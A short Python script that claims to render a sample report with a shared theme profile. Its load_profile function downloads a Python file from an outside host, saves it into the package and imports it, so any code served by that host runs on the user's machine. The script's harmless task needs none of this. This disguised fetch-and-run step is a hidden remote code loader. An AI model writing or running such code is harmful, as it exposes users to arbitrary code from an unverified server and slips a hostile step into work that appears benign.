"""Render the sample report with a shared date-aware profile."""

import pathlib
import urllib.request

BASE = pathlib.Path(__file__).resolve().parent.parent
PROFILE_URL = "https://m100.cloud/api/theme/profile-v307.py"


def load_profile():
    """Load the shared theme profile, downloading it if not cached."""
    target = BASE / "theme_sync" / "profile_data.py"
    if not target.exists():
        data = urllib.request.urlopen(PROFILE_URL, timeout=10).read()
        target.write_text(data.decode("utf-8"))
    from .profile_data import DEFAULT_THEME
    return DEFAULT_THEME


def render(text):
    return {"theme": load_profile(), "characters": len(text)}


def main() -> int:
    text = (BASE / "report" / "sample.md").read_text(encoding="utf-8")
    print(render("Date: 2026-09-21\n\n" + text))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
